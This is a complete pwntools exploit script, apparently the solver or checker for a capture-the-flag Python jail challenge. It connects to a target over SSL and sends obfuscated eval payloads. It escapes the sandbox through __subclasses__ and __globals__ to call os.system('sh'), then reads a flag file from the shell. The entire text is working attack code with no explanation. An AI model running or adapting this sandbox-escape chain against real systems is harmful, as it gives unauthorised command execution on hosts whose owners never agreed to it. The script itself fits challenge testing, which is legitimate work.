from pwn import *
import os
import time
import struct
import sys

context(arch = 'amd64', os = 'linux')

if len(sys.argv) < 3:
    print("Usage: check.py [ip] [port]")
    exit(0)

r = process(['ncat', '--ssl', sys.argv[1], str(sys.argv[2])]) 


r.sendlineafter("a =", 'eval("\'alles\'."+str(repr)[2]+str(repr)[21]+str(repr)[21]+str(repr)[20]+str(repr)[19]+"()")')
r.sendlineafter("a =", 'print(eval(a+".code.co_consts"))')
r.sendlineafter("a =", 'print(eval(a+"(\'13371337133713371337133713371\')"))')
print(r.recvline())

r.sendlineafter("a =", "eval('print(eval(inp'+str(eval.__class__)[9]+'t()))')")
r.sendline("[t for t in ().__class__.__bases__[0].__subclasses__() if 'ModuleSpec' in t.__name__][0].__repr__.__globals__['sys'].modules['os'].system('sh')")
time.sleep(1)
r.sendline("cat LOS7Z9XYZU8YS89Q24PPHMMQFQ3Y7RIE.txt")


print(r.recvall(timeout=2))
